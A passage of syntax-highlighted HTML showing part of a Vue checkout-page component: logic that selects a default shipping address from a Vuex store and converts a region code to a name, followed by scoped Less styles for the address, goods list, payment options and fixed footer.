style="color: #D4D4D4">) {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #6A9955">// 找到后将数组数据转对象赋值给chosenAddress属性</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4">[</span><span style="color: #9CDCFE">defaultIndex</span><span style="color: #D4D4D4">];</span></span><span class="line"></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #6A9955">// 处理地址Code转为Name</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">regionId</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">String</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">region_id</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #6A9955">// 调用 getFullAddressInfo 方法</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">regionName</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">fetchFullAddressName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">regionId</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"未找到有效的默认地址索引"</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          }</span></span><span class="line"><span style="color: #D4D4D4">        } </span><span style="color: #C586C0">else</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// Vuex没有默认地址，则默认选中第一个地址</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #6A9955">// 设置chosenAddress属性为addressList的第一个地址</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4"> = </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">addressList</span><span style="color: #D4D4D4">[</span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">];</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">const</span><span style="color: #D4D4D4"> </span><span style="color: #4FC1FF">regionId</span><span style="color: #D4D4D4"> = </span><span style="color: #DCDCAA">String</span><span style="color: #D4D4D4">(</span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddress</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">region_id</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">regionName</span><span style="color: #D4D4D4"> = </span><span style="color: #C586C0">await</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">fetchFullAddressName</span><span style="color: #D4D4D4">(</span><span style="color: #9CDCFE">regionId</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">          </span><span style="color: #9CDCFE">console</span><span style="color: #D4D4D4">.</span><span style="color: #DCDCAA">log</span><span style="color: #D4D4D4">(</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #CE9178">"无默认地址，展示数据chosenAddress："</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">            </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">chosenAddress</span></span><span class="line"><span style="color: #D4D4D4">          );</span></span><span class="line"><span style="color: #D4D4D4">        }</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #DCDCAA">data</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">addressList:</span><span style="color: #D4D4D4"> [], </span><span style="color: #6A9955">// 地址列表</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">chosenAddress:</span><span style="color: #D4D4D4"> {}, </span><span style="color: #6A9955">// 被选择进行展示的地址</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">regionName:</span><span style="color: #D4D4D4"> {}, </span><span style="color: #6A9955">// 将地址Code转为Name</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">cartList:</span><span style="color: #D4D4D4"> [], </span><span style="color: #6A9955">// 购物车列表</span></span><span class="line"><span style="color: #D4D4D4">    };</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">computed:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #DCDCAA">getadsid</span><span style="color: #D4D4D4">() {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #C586C0">return</span><span style="color: #D4D4D4"> </span><span style="color: #569CD6">this</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">$route</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">query</span><span style="color: #D4D4D4">.</span><span style="color: #9CDCFE">adsid</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    },</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">methods:</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"getAddressList"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"getAddressDetail"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapGetters</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Address"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"getDefaultAddressId"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"AddressMap"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"buildReverseMaps"</span><span style="color: #D4D4D4">, </span><span style="color: #CE9178">"fetchFullAddressName"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapActions</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Cart"</span><span style="color: #D4D4D4">, [</span><span style="color: #CE9178">"getCartAction"</span><span style="color: #D4D4D4">]),</span></span><span class="line"><span style="color: #D4D4D4">    ...</span><span style="color: #DCDCAA">mapGetters</span><span style="color: #D4D4D4">(</span><span style="color: #CE9178">"Cart"</span><span style="color: #D4D4D4">, [</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"selectedCartList"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"selectedCartCount"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #CE9178">"selectedPrice"</span><span style="color: #D4D4D4">,</span></span><span class="line"><span style="color: #D4D4D4">    ]),</span></span><span class="line"><span style="color: #D4D4D4">  },</span></span><span class="line"><span style="color: #D4D4D4">};</span></span><span class="line"><span style="color: #808080">&lt;/</span><span style="color: #569CD6">script</span><span style="color: #808080">&gt;</span></span><span class="line"></span><span class="line"><span style="color: #808080">&lt;</span><span style="color: #569CD6">style</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">lang</span><span style="color: #D4D4D4">=</span><span style="color: #CE9178">"less"</span><span style="color: #D4D4D4"> </span><span style="color: #9CDCFE">scoped</span><span style="color: #808080">&gt;</span></span><span class="line"><span style="color: #D7BA7D">.pay</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  ::</span><span style="color: #569CD6">v-deep</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.van-nav-bar__arrow</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.address</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">align-items</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">center</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-start</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#666</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">relative</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">url(@</span><span style="color: #CE9178">/assets/border-line.png</span><span style="color: #DCDCAA">)</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">bottom</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">repeat-x</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">60px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.left-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.right-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">absolute</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">50%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">transform</span><span style="color: #D4D4D4">: </span><span style="color: #DCDCAA">translateY</span><span style="color: #D4D4D4">(</span><span style="color: #B5CEA8">-7px</span><span style="color: #D4D4D4">);</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.goods-item</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">margin-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">6px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">img</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">80px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">auto</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.right</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1.3</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex-direction</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">column</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-evenly</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">.info</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">margin-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #D7BA7D">.price</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">        </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">      }</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.flow-num-box</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex-end</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.money</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.pay-cell</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">justify-content</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">space-between</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.red</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"><span style="color: #D7BA7D">.pay-detail</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.pay-way</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#333</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.tit</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">30px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.pay-cell</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">10px</span><span style="color: #D4D4D4"> </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.van-icon</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">20px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">margin-right</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">5px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.buytips</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">textarea</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">block</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">border</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">none</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: #D4D4D4">}</span></span><span class="line"></span><span class="line"><span style="color: #D7BA7D">.footer-fixed</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">position</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">fixed</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">background-color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fff</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">left</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">bottom</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">0</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">width</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">100%</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">line-height</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">46px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">border-top</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1px</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">solid</span><span style="color: #D4D4D4"> </span><span style="color: #CE9178">#efefef</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">font-size</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">14px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #9CDCFE">display</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">flex</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">  </span><span style="color: #D7BA7D">.left</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">flex</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">1</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">padding-left</span><span style="color: #D4D4D4">: </span><span style="color: #B5CEA8">12px</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#666</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    </span><span style="color: #D7BA7D">span</span><span style="color: #D4D4D4"> {</span></span><span class="line"><span style="color: #D4D4D4">      </span><span style="color: #9CDCFE">color</span><span style="color: #D4D4D4">: </span><span style="color: #CE9178">#fa2209</span><span style="color: #D4D4D4">;</span></span><span class="line"><span style="color: #D4D4D4">    }</span></span><span class="line"><span style="color: #D4D4D4">  }</span></span><span class="line"><span style="color: 